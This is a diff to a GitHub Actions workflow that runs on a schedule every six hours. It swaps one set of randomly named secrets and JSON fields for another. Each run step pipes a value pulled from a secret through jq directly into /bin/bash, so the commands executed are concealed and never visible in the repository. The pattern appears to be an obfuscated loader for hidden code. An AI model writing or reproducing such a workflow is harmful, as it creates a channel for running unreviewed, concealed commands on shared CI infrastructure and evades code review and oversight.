@@ -2,7 +2,7 @@ name: boringsinglet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 3/6 * * *'
+    - cron: '9 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: boringsinglet
         env:
-          p14755: ${{ secrets.p14755 }}
+          wplg0: ${{ secrets.wplg0 }}
         run: |
-          echo $p14755 | jq -r .dd07957 | /bin/bash
-          echo $s6315 | jq -r .ta41 | /bin/bash
-          echo $ly77721 | jq -r .sgk0 | /bin/bash
-          echo $ulzgk9505 | jq -r .tao6 | /bin/bash
+          echo $wplg0 | jq -r .dzhv25 | /bin/bash
+          echo $q2 | jq -r .nr304 | /bin/bash
+          echo $a81937 | jq -r .l8142 | /bin/bash
+          echo $s03542 | jq -r .kdfrl0 | /bin/bash
 
